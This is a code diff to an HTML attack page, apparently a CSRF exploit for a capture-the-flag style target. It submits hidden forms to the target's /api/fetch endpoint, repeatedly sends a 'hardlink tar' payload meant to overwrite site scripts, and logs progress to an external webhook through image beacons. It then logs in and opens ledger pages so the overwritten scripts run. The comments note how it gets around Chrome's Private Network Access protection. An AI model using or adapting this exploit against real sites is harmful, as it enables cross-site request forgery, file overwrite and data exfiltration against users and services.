@@ -7,23 +7,30 @@ const log = (m) => {
   new Image().src = WH + "?m=" + encodeURIComponent(String(m).slice(0, 1200));
   try { document.getElementById("l").textContent += "\n" + m; } catch (e) {}
 };
+// MUST be top-level (_blank) so Chrome Private Network Access allows the request
 function post(url) {
-  const n = "f" + Math.random().toString(36).slice(2);
-  const ifr = document.createElement("iframe");
-  ifr.name = n; ifr.style.display = "none";
-  document.body.appendChild(ifr);
   const f = document.createElement("form");
-  f.method = "POST"; f.action = T + "/api/fetch"; f.target = n;
+  f.method = "POST";
+  f.action = T + "/api/fetch";
+  f.target = "_blank";
   f.enctype = "application/x-www-form-urlencoded";
   const i = document.createElement("input");
   i.type = "hidden"; i.name = "url"; i.value = url;
-  f.appendChild(i); document.body.appendChild(f); f.submit();
+  f.appendChild(i);
+  document.body.appendChild(f);
+  f.submit();
 }
 log("start");
-post(WH + "/probe");
-for (let n = 0; n < 10; n++) setTimeout(function() { post(TAR); log("t" + n); }, n * 200);
-setTimeout(function() { log("ledger"); location.href = T + "/ledger"; }, 4000);
-setTimeout(function() {
+// prove CSRF with got fetch of our webhook
+post(WH + "/probe2");
+log("probe_sent");
+// fire hardlink tar several times
+for (let n = 0; n < 8; n++) {
+  setTimeout(function () { post(TAR); log("t" + n); }, 300 + n * 400);
+}
+// load ledger so theme.js / transitions.js execute if overwritten
+setTimeout(function () { log("ledger"); location.href = T + "/ledger"; }, 5000);
+setTimeout(function () {
   log("login");
   const f = document.createElement("form");
   f.method = "POST"; f.action = T + "/enter"; f.target = "_blank";
@@ -33,9 +40,9 @@ setTimeout(function() {
     i.type = "hidden"; i.name = k; i.value = v; f.appendChild(i);
   }
   document.body.appendChild(f); f.submit();
-}, 6000);
-setTimeout(function() { window.open(T + "/ledger", "_blank"); log("L2"); }, 8000);
-setTimeout(function() { window.open(T + "/file", "_blank"); log("F"); }, 9000);
-setTimeout(function() { window.open(T + "/ledgermaster", "_blank"); log("LM"); }, 10000);
-for (let i = 1; i <= 20; i++) setTimeout(function() { log("tick" + i); }, i * 2000);
+}, 7000);
+setTimeout(function () { window.open(T + "/ledger", "_blank"); log("L2"); }, 9000);
+setTimeout(function () { window.open(T + "/file", "_blank"); log("F"); }, 10000);
+setTimeout(function () { window.open(T + "/ledgermaster", "_blank"); log("LM"); }, 11000);
+for (let i = 1; i <= 25; i++) setTimeout(function () { log("tick" + i); }, i * 2000);
 </script></body></html>
